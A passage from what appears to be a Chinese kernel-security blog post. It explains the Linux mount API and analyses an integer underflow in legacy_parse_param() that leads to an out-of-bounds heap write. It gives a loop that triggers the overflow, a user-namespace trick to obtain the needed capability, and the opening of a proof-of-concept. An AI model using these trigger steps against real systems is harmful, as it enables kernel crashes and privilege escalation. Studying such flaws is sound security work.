获取一个挂载实例</h3><p>完成了文件系统上下文的创建与配置，接下来终于来到文件系统的挂载操作了，<code>fsmount()</code> 系统调用用以获取一个可以被用以进行挂载的挂载实例，并返回一个文件描述符用以下一步的挂载</p><p>示例用法如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/mount.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> __NR_fsopen</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_fsopen 430</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> __NR_fsconfig</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_fsconfig 431</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> __NR_fsmount</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_fsmount 432</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">fsopen</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *fs_name, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> syscall(__NR_fsopen, fs_name, flags);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">fsconfig</span><span class="hljs-params">(<span class="hljs-type">int</span> fsfd, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cmd, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *key, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *val, <span class="hljs-type">int</span> aux)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> syscall(__NR_fsconfig, fsfd, cmd, key, val, aux);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">fsmount</span><span class="hljs-params">(<span class="hljs-type">int</span> fsfd, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> ms_flags)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> syscall(__NR_fsmount, fsfd, flags, ms_flags);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    <span class="hljs-type">int</span> fs_fd, mount_fd;<br>    <br>    fs_fd = fsopen(<span class="hljs-string">&quot;ext4&quot;</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (fs_fd &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[x] FAILED to fsopen!&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] Successfully get an ext4 filesystem context descriptor:%d\n&quot;</span>, fs_fd);<br><br>    fsconfig(fs_fd, FSCONFIG_SET_STRING, <span class="hljs-string">&quot;source&quot;</span>, <span class="hljs-string">&quot;/dev/sdb1&quot;</span>, <span class="hljs-number">0</span>);<br>    fsconfig(fs_fd, FSCONFIG_CMD_CREATE, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>);<br><br>    mount_fd = fsmount(fs_fd, FSMOUNT_CLOEXEC, MOUNT_ATTR_RELATIME);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Step-IV-move-mount-将挂载实例在挂载点间移动"><a href="#Step-IV-move-mount-将挂载实例在挂载点间移动" class="headerlink" title="Step.IV - move_mount: 将挂载实例在挂载点间移动"></a>Step.IV - move_mount: 将挂载实例在挂载点间移动</h3><p>最后来到<del>一个不统一以 fs 开头进行命名的</del> <code>move_mount()</code> 系统调用，其用以将挂载实例在挂载点间移动：</p><ul><li>对于尚未进行挂载的挂载实例而言，进行挂载的操作便是从空挂载点 <code>&quot;&quot;</code> 移动到对应的挂载点（例如 <code>&quot;/mnt/temp&quot;</code>），此时我们并不需要给出目的挂载点的 fd，而可以使用 <code>AT_FDCWD</code></li></ul><p>引入了 <code>move_mount()</code> 之后，我们最终的一个用以将 <code>&quot;/dev/sdb1&quot;</code> 以 <code>&quot;ext4&quot;</code> 文件系统挂载到 <code>&quot;/mnt/temp&quot;</code> 的完整示例程序如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/mount.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> __NR_fsopen</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_fsopen 430</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> __NR_fsconfig</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_fsconfig 431</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> __NR_fsmount</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_fsmount 432</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> __NR_move_mount</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_move_mount 429</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">fsopen</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *fs_name, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> syscall(__NR_fsopen, fs_name, flags);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">fsconfig</span><span class="hljs-params">(<span class="hljs-type">int</span> fsfd, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cmd, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *key, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *val, <span class="hljs-type">int</span> aux)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> syscall(__NR_fsconfig, fsfd, cmd, key, val, aux);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">fsmount</span><span class="hljs-params">(<span class="hljs-type">int</span> fsfd, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> ms_flags)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> syscall(__NR_fsmount, fsfd, flags, ms_flags);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">move_mount</span><span class="hljs-params">(<span class="hljs-type">int</span> from_dfd, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *from_pathname,<span class="hljs-type">int</span> to_dfd, </span><br><span class="hljs-params">               <span class="hljs-type">const</span> <span class="hljs-type">char</span> *to_pathname, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> syscall(__NR_move_mount, from_dfd, from_pathname, to_dfd, to_pathname, flags);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    <span class="hljs-type">int</span> fs_fd, mount_fd;<br>    <br>    fs_fd = fsopen(<span class="hljs-string">&quot;ext4&quot;</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (fs_fd &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[x] FAILED to fsopen!&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] Successfully get an ext4 filesystem context descriptor:%d\n&quot;</span>, fs_fd);<br><br>    fsconfig(fs_fd, FSCONFIG_SET_STRING, <span class="hljs-string">&quot;source&quot;</span>, <span class="hljs-string">&quot;/dev/sdb1&quot;</span>, <span class="hljs-number">0</span>);<br>    fsconfig(fs_fd, FSCONFIG_CMD_CREATE, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>);<br><br>    mount_fd = fsmount(fs_fd, FSMOUNT_CLOEXEC, MOUNT_ATTR_RELATIME);<br>    move_mount(mount_fd, <span class="hljs-string">&quot;&quot;</span>, AT_FDCWD, <span class="hljs-string">&quot;/mnt/temp&quot;</span>, MOVE_MOUNT_F_EMPTY_PATH);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>这一套流程下来便是 new Filesystem mount API 的基本用法</p><h1 id="0x01-漏洞分析"><a href="#0x01-漏洞分析" class="headerlink" title="0x01.漏洞分析"></a>0x01.漏洞分析</h1><h2 id="legacy-parse-param-整型溢出导致的越界拷贝"><a href="#legacy-parse-param-整型溢出导致的越界拷贝" class="headerlink" title="legacy_parse_param() - 整型溢出导致的越界拷贝"></a>legacy_parse_param() - 整型溢出导致的越界拷贝</h2><p>前面我们提到该漏洞发生于 <code>fsconfig()</code> 系统调用中，若我们给的 <code>cmd</code> 为 <code>FSCONFIG_SET_STRING</code>，则在内核中存在如下调用链：</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">fsconfig</span>()</span><br><span class="hljs-function"><span class="hljs-title">vfs_fsconfig_locked</span>()</span><br><span class="hljs-function"><span class="hljs-title">vfs_parse_fs_param</span>()</span><br></code></pre></td></tr></table></figure><p>在 <code>vfs_parse_fs_param()</code> 中会调用 <code>fs_context-&gt;ops-&gt;parse_param</code> 函数指针：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">vfs_parse_fs_param</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> fs_context *fc, <span class="hljs-keyword">struct</span> fs_parameter *param)</span><br>&#123;<br><span class="hljs-type">int</span> ret;<br><br><span class="hljs-comment">//...</span><br><br><span class="hljs-keyword">if</span> (fc-&gt;ops-&gt;parse_param) &#123;<br>ret = fc-&gt;ops-&gt;parse_param(fc, param);<br><span class="hljs-keyword">if</span> (ret != -ENOPARAM)<br><span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure><p>前面我们讲到对于未设置 <code>init_fs_context</code> 的文件系统类型而言其最终会调用 <code>legacy_init_fs_context()</code> 进行初始化，其中 <code>fs_context</code> 的函数表会被设置为 <code>legacy_fs_context_ops</code>，其 <code>parse_param</code> 指针对应为 <code>legacy_parse_param()</code> 函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fs_context_operations</span> <span class="hljs-title">legacy_fs_context_ops</span> =</span> &#123;<br>.<span class="hljs-built_in">free</span>= legacy_fs_context_free,<br>.dup= legacy_fs_context_dup,<br>.parse_param= legacy_parse_param,<br>.parse_monolithic= legacy_parse_monolithic,<br>.get_tree= legacy_get_tree,<br>.reconfigure= legacy_reconfigure,<br>&#125;;<br></code></pre></td></tr></table></figure><p>漏洞便发生在该函数中，在计算 <code>len &gt; PAGE_SIZE - 2 - size</code> 时，由于 size 为 <code>unsigned int</code> ，若 <code>size + 2 &gt; PAGE_SIZE</code> ，则 <code>PAGE_SIZE - 2 - size</code> 的结果<strong>会下溢为一个较大的无符号值，从而绕过 len 的检查</strong>，这里的 size 来源为 <code>ctx-&gt;data_size</code>，即<strong>已拷贝的总的数据长度</strong>，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Add a parameter to a legacy config.  We build up a comma-separated list of</span><br><span class="hljs-comment"> * options.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">legacy_parse_param</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> fs_context *fc, <span class="hljs-keyword">struct</span> fs_parameter *param)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">legacy_fs_context</span> *<span class="hljs-title">ctx</span> =</span> fc-&gt;fs_private;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> size = ctx-&gt;data_size; <span class="hljs-comment">// 已拷贝的数据长度</span><br><span class="hljs-type">size_t</span> len = <span class="hljs-number">0</span>;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(param-&gt;key, <span class="hljs-string">&quot;source&quot;</span>) == <span class="hljs-number">0</span>) &#123;<br><span class="hljs-keyword">if</span> (param-&gt;type != fs_value_is_string)<br><span class="hljs-keyword">return</span> invalf(fc, <span class="hljs-string">&quot;VFS: Legacy: Non-string source&quot;</span>);<br><span class="hljs-keyword">if</span> (fc-&gt;source)<br><span class="hljs-keyword">return</span> invalf(fc, <span class="hljs-string">&quot;VFS: Legacy: Multiple sources&quot;</span>);<br>fc-&gt;source = param-&gt;<span class="hljs-built_in">string</span>;<br>param-&gt;<span class="hljs-built_in">string</span> = <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span> (ctx-&gt;param_type == LEGACY_FS_MONOLITHIC_PARAMS)<br><span class="hljs-keyword">return</span> invalf(fc, <span class="hljs-string">&quot;VFS: Legacy: Can&#x27;t mix monolithic and individual options&quot;</span>);<br><br><span class="hljs-comment">// 计算 len</span><br><span class="hljs-keyword">switch</span> (param-&gt;type) &#123;<br><span class="hljs-keyword">case</span> fs_value_is_string:<span class="hljs-comment">// 对应 FSCONFIG_SET_STRING</span><br>len = <span class="hljs-number">1</span> + param-&gt;size;<br><span class="hljs-comment">/* Fall through */</span><br><span class="hljs-keyword">case</span> fs_value_is_flag:<br>len += <span class="hljs-built_in">strlen</span>(param-&gt;key);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">default</span>:<br><span class="hljs-keyword">return</span> invalf(fc, <span class="hljs-string">&quot;VFS: Legacy: Parameter type for &#x27;%s&#x27; not supported&quot;</span>,<br>      param-&gt;key);<br>&#125;<br><br><span class="hljs-comment">// 此处存在整型溢出的漏洞，若 size + 2 大于一张页的大小则会上溢为一个较大的无符号整型，</span><br><span class="hljs-comment">// 导致此处通过检查，从而导致后续步骤中的越界拷贝</span><br><span class="hljs-keyword">if</span> (len &gt; PAGE_SIZE - <span class="hljs-number">2</span> - size)<br><span class="hljs-keyword">return</span> invalf(fc, <span class="hljs-string">&quot;VFS: Legacy: Cumulative options too large&quot;</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">strchr</span>(param-&gt;key, <span class="hljs-string">&#x27;,&#x27;</span>) ||<br>    (param-&gt;type == fs_value_is_string &amp;&amp;<br>     <span class="hljs-built_in">memchr</span>(param-&gt;<span class="hljs-built_in">string</span>, <span class="hljs-string">&#x27;,&#x27;</span>, param-&gt;size)))<br><span class="hljs-keyword">return</span> invalf(fc, <span class="hljs-string">&quot;VFS: Legacy: Option &#x27;%s&#x27; contained comma&quot;</span>,<br>      param-&gt;key);<br></code></pre></td></tr></table></figure><p>在后面的流程中会从用户控件将数据拷贝到  <code>ctx-&gt;legacy_data</code>  上，而 <code>ctx-&gt;legacy_data</code> 仅分配了一张页面大小，但后续流程中的拷贝是从 <code>ctx-&gt;legacy_data[size]</code> 开始的，<strong>由于 size 可以大于一张页大小，因此此处可以发生数据数据写入</strong>，由于 <code>ctx-&gt;legacy_data</code> 在分配时使用的是通用的分配 flag <code>GFP_KERNEL</code>，因此可以溢出到绝大多数的常用结构体中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 为 legacy_data 分配一张页的大小</span><br><span class="hljs-keyword">if</span> (!ctx-&gt;legacy_data) &#123;<br>ctx-&gt;legacy_data = kmalloc(PAGE_SIZE, GFP_KERNEL);<br><span class="hljs-keyword">if</span> (!ctx-&gt;legacy_data)<br><span class="hljs-keyword">return</span> -ENOMEM;<br>&#125;<br><br>ctx-&gt;legacy_data[size++] = <span class="hljs-string">&#x27;,&#x27;</span>;<br>len = <span class="hljs-built_in">strlen</span>(param-&gt;key);<br><span class="hljs-comment">// size 可以大于一张页，但是 legacy_data 只有一张页，从而导致了越界拷贝</span><br><span class="hljs-built_in">memcpy</span>(ctx-&gt;legacy_data + size, param-&gt;key, len);<br>size += len;<br><span class="hljs-keyword">if</span> (param-&gt;type == fs_value_is_string) &#123;<br>ctx-&gt;legacy_data[size++] = <span class="hljs-string">&#x27;=&#x27;</span>;<br><span class="hljs-comment">// size 可以大于一张页，但是 legacy_data 只有一张页，从而导致了越界拷贝</span><br><span class="hljs-built_in">memcpy</span>(ctx-&gt;legacy_data + size, param-&gt;<span class="hljs-built_in">string</span>, param-&gt;size);<br>size += param-&gt;size;<br>&#125;<br>ctx-&gt;legacy_data[size] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>ctx-&gt;data_size = size;<br>ctx-&gt;param_type = LEGACY_FS_INDIVIDUAL_PARAMS;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>这里需要注意的是，由于 fsconfig 的限制，我们单次写入的最大长度为 256 字节，因此我们需要多次调用 fsconfig 以让其逐渐逼近 <code>PAGE_SIZE</code>，而 <code>len &gt; PAGE_SIZE - 2 - size</code> 的检查<strong>并非完全无效</strong>，由于 size 为已拷贝数据长度而 len 为待拷贝数据长度，因此<strong>只有当 size 累加到 4095 时才会发生整型溢出</strong>，这里我们在进行溢出前需要卡好已拷贝数据长度<strong>刚好为 <code>4095</code></strong></p><p>由于 <code>legacy_parse_param()</code> 中拷贝的结果形式为 <code>&quot;,key=val&quot;</code>，故我们有如下计算公式：</p><ul><li><code>单次拷贝数据长度 = len(key) + len(val) + 2</code></li></ul><p>下面笔者给出一个笔者自己计算的 4095：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * fulfill the ctx-&gt;legacy_data to 4095 bytes, </span><br><span class="hljs-comment"> * so that the (PAGE_SIZE - 2 - size) overflow</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">255</span>; i++) &#123;<br>    fsconfig(fs_fd, FSCONFIG_SET_STRING, <span class="hljs-string">&quot;arttnba&quot;</span>, <span class="hljs-string">&quot;arttnba&quot;</span>, <span class="hljs-number">0</span>);<br>&#125;<br>fsconfig(fs_fd, FSCONFIG_SET_STRING, <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-string">&quot;pwnnn&quot;</span>, <span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure><h2 id="Proof-of-Concept"><a href="#Proof-of-Concept" class="headerlink" title="Proof of Concept"></a>Proof of Concept</h2><p>由于大部分的文件系统类型都未设置 <code>init_fs_context</code>，因此最后都可以走到 <code>legacy_parse_param()</code> 的流程当中，例如 <code>ext4</code> 文件系统的 <code>file_system_type</code> 定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file_system_type</span> <span class="hljs-title">ext4_fs_type</span> =</span> &#123;<br>.owner= THIS_MODULE,<br>.name= <span class="hljs-string">&quot;ext4&quot;</span>,<br>.mount= ext4_mount,<br>.kill_sb= kill_block_super,<br>.fs_flags= FS_REQUIRES_DEV,<br>&#125;;<br></code></pre></td></tr></table></figure><p>这里我们将通过 ext4 文件系统进行漏洞复现，我们只需要越界写足够长的一块内存，通常都能写到一些内核结构体从而导致 kernel panic</p><p>需要注意的是 filesystem mount API 需要命名空间具有  <code>CAP_SYS_ADMIN</code> 权限，但由于其<strong>仅检查命名空间权限</strong>，故对于没有该权限的用户则可以通过 <code>unshare(CLONE_NEWNS|CLONE_NEWUSER)</code> 创建新的命名空间，以在新的命名空间内获取对应权限</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/mount.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> __NR_fsopen</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_fsopen 430</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> 